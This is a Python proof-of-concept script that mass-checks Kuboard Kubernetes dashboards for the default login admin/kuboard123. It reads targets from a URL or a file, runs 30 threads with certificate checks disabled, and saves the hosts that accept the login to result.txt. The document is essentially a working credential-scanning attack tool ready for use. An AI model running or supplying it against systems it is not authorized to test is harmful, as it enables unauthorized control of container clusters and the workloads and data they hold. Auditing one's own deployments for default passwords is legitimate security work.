#Kuboard弱口令漏洞poc
import requests,argparse,sys,json
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
def banner():
    text="""


██╗  ██╗██╗   ██╗██████╗  ██████╗  █████╗ ██████╗ ██████╗       ██╗    ██╗███████╗ █████╗ ██╗  ██╗     ██████╗  █████╗ ███████╗███████╗██╗    ██╗ ██████╗ ██████╗ ██████╗ 
██║ ██╔╝██║   ██║██╔══██╗██╔═══██╗██╔══██╗██╔══██╗██╔══██╗      ██║    ██║██╔════╝██╔══██╗██║ ██╔╝     ██╔══██╗██╔══██╗██╔════╝██╔════╝██║    ██║██╔═══██╗██╔══██╗██╔══██╗
█████╔╝ ██║   ██║██████╔╝██║   ██║███████║██████╔╝██║  ██║█████╗██║ █╗ ██║█████╗  ███████║█████╔╝█████╗██████╔╝███████║███████╗███████╗██║ █╗ ██║██║   ██║██████╔╝██║  ██║
██╔═██╗ ██║   ██║██╔══██╗██║   ██║██╔══██║██╔══██╗██║  ██║╚════╝██║███╗██║██╔══╝  ██╔══██║██╔═██╗╚════╝██╔═══╝ ██╔══██║╚════██║╚════██║██║███╗██║██║   ██║██╔══██╗██║  ██║
██║  ██╗╚██████╔╝██████╔╝╚██████╔╝██║  ██║██║  ██║██████╔╝      ╚███╔███╔╝███████╗██║  ██║██║  ██╗     ██║     ██║  ██║███████║███████║╚███╔███╔╝╚██████╔╝██║  ██║██████╔╝
╚═╝  ╚═╝ ╚═════╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝        ╚══╝╚══╝ ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝     ╚═╝     ╚═╝  ╚═╝╚══════╝╚══════╝ ╚══╝╚══╝  ╚═════╝ ╚═╝  ╚═╝╚═════╝ 
                                                                                                                                                                          
                                                     author:zm
"""
    print(text)
def main():
    banner()
    arges=argparse.ArgumentParser(description='This is Kuboard weak password vulnerability POCc')
    arges.add_argument('-u','--url',dest='url',type=str,help='Please input your link')
    arges.add_argument('-f','--file',dest='file',type=str,help='Please input your file path')
    arg=arges.parse_args()
    if arg.url and not arg.file:
        poc(arg.url)
    elif arg.file and not arg.url:
        url_list=[]
        with open (arg.file,'r',encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip())
            mp=Pool(30)
            mp.map(poc,url_list)
            mp.close()
            mp.join()
    else:
        print(f"Usag:\n\t python {sys.argv[0]} -h")
def poc(target):
    api='/api/validate_password'
    header={
        'user-agent':'mozilla/5.0 (windows Nt 10.0; win64; x64; rv:128.0) gecko/20100101 firefox/128.0',
        'accept':'application/json, text/plain, */*',
        'accept-language':'ZH-cn,zh;q=0.8,ZH-tw;q=0.7,ZH-hk;q=0.5,EN-us;q=0.3,en;q=0.2',
        'accept-encoding':'gzip, deflate, br',
        'content-type':'application/json',
        'authorization':'bearer undefined',
        'content-length':'44',
    }
    data={
        "username":"admin","password":"kuboard123"
    }
    try:
        res=requests.post(url=target+api,headers=header,json=data,timeout=5,verify=False)
        res1=json.loads(res.text)
        if res1['message']=='success':
            print(f"[+]{target} have loophole “{target+api}”")
            with open ('result.txt','a',encoding='utf-8') as f:
                f.write(target+'\n')
        else:
            print(f"[-]{target} have loophole")
    except:
        pass
if __name__=='__main__':
    main()
